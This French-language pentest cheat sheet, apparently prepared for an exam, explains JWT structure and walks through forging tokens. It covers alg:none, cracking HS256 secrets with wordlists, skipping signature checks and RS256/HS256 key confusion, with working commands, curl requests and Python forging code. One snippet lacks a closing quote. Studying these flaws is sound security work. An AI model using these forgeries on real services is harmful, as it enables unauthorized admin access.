# JWT — JSON Web Token

## 1. Structure d'un JWT

Un JWT est composé de **3 parties encodées en base64url**, séparées par des points :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
       HEADER                                    PAYLOAD                              SIGNATURE
```

### 1.1 Décoder manuellement

```bash
# Header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

# Payload
echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9" | base64 -d
# → {"user":"guest","role":"user"}
```

!!! tip "Outil en ligne"
    **jwt.io** → coller le token → décode et vérifie la signature en live.

### 1.2 Algorithmes courants

| Algo              | Type        | Description                                         |
|-------------------|-------------|-----------------------------------------------------|
| `HS256`           | Symétrique  | HMAC-SHA256, clé secrète partagée                   |
| `HS384` / `HS512` | Symétrique  | Variantes HMAC                                      |
| `RS256`           | Asymétrique | RSA, clé privée pour signer, publique pour vérifier |
| `none`            | Aucun       | Pas de signature — critique si accepté              |

---

## 2. Identifier un JWT

Les JWTs apparaissent dans :

- Cookie : `Authorization=eyJ...`
- Header HTTP : `Authorization: Bearer eyJ...`
- Body de réponse JSON : `{"token": "eyJ..."}`
- LocalStorage (visible dans DevTools → Application)

Reconnaître un JWT : commence toujours par `eyJ` (= `{"` en base64url).

---

## 3. Attaque 1 — Algorithme `none`

Certains serveurs mal configurés acceptent un token **sans signature** si `alg` vaut `none`.

### 3.1 Principe

```
Token original : header.payload.signature
Token forgé   : header_none.payload_modifié.   ← signature vide
```

### 3.2 Procédure

```bash
# 1. Décoder le header original
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

# 2. Créer le nouveau header avec alg:none
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# 3. Modifier le payload (ex: passer admin)
echo -n '{"user":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'
# → eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ

# 4. Assembler le token forgé (signature vide = rien après le dernier point)
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."

# 5. Tester avec curl
curl -H "Authorization: Bearer $TOKEN" http://TARGET/admin
```

!!! warning "Variantes à tester"
    Tester aussi `"alg":"None"`, `"alg":"NONE"` — certains serveurs sont sensibles à la casse.

---

## 4. Attaque 2 — Brute force de la clé secrète (HS256)

Si l'algorithme est HS256, la clé secrète peut être faible et crackable.

```bash
# hashcat
hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 token.txt
```

Format du fichier `token.txt` pour john :
```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE
```

**Si la clé est trouvée :** → recréer et signer un token forgé avec cette clé.

```python
# Signer un token avec python (pip install pyjwt)

import jwt
token = jwt.encode({"user": "admin", "role": "admin"}, "found_secret", algorithm="HS256")
print(token)
```

---

## 5. Attaque 3 — Modification du payload sans vérification

Parfois l'application **ne vérifie pas la signature** du tout (mauvaise implémentation).

### 5.1 Tester

```bash
# Modifier n'importe quel champ dans le payload
# Ré-encoder en base64url sans changer la signature
# Si le serveur accepte → vulnérable
```

### 5.2 Procédure manuelle

```bash
# Payload original
echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | base64 -d
# → {"user":"guest"}

# Nouveau payload
echo -n '{"user":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'
# → eyJ1c2VyIjoiYWRtaW4ifQ

# Remplacer la partie payload dans le token original (garder header + signature)
# eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE_ORIGINALE
```

---

## 6. Attaque 4 — Confusion RS256 → HS256

Si le serveur utilise RS256 (clé publique/privée) et que la clé publique est accessible :

- Forger un token HS256 signé avec la **clé publique comme secret**
- Un serveur mal codé peut confondre les deux algos

```bash
# Récupérer la clé publique (souvent exposée dans /.well-known/jwks.json ou /api/public-key)
curl http://TARGET/.well-known/jwks.json

# Signer avec la clé publique en HS256
python3 -c "
import jwt, base64
pub_key = open('public.pem','rb').read()
token = jwt.encode({'user':'admin'}, pub_key, algorithm='HS256')
print(token)
"
```

---

## 7. Outils

### 7.1 jwt.io
Site web : **https://jwt.io**

- Décoder / inspecter un token visuellement
- Modifier le payload et re-signer si on a la clé
- Vérifier la signature

### 7.2 jwt_tool
```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt --break-system-packages

# Décoder un token
python3 jwt_tool.py TOKEN

# Tester alg:none
python3 jwt_tool.py TOKEN -X a

# Brute force clé secrète
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Modifier le payload et signer avec une clé connue
python3 jwt_tool.py TOKEN -T -S hs256 -p "SECRET"
```

### 7.3 Burp Suite — JWT Editor (extension)
Extensions → JWT Editor  
→ Permet de modifier et re-signer les tokens directement dans Burp Repeater.

### 7.4 Python
```bash
python3 -c "
import jwt
payload = {
    'key': 'value'
}
token = jwt.encode(payload, 'TON_SECRET', algorithm='HS256')
print(token)
```

---

## 8. Workflow exam

```
1. Repérer les JWTs (cookies, headers Authorization, localStorage)
2. Décoder avec jwt.io ou base64 -d
   → Identifier l'algo (alg) et les claims (user, role, admin...)
3. Tester alg:none
   → Forger un token sans signature avec rôle admin
4. Si HS256 → brute force clé avec hashcat/jwt_tool + rockyou
5. Si clé trouvée → recréer token signé avec python/jwt_tool
6. Si RS256 → chercher la clé publique (JWKS endpoint)
7. Tester la modification du payload sans changer la signature
   → Si accepté → l'app ne vérifie pas la signature
8. Injecter le token forgé dans la requête
   → Cookie ou header Authorization: Bearer TOKEN
```

!!! tip "Claims à cibler dans le payload"
    `"role": "admin"`, `"admin": true`, `"isAdmin": 1`, `"user": "admin"`, `"sub": "1"` (ID 1 = souvent admin)
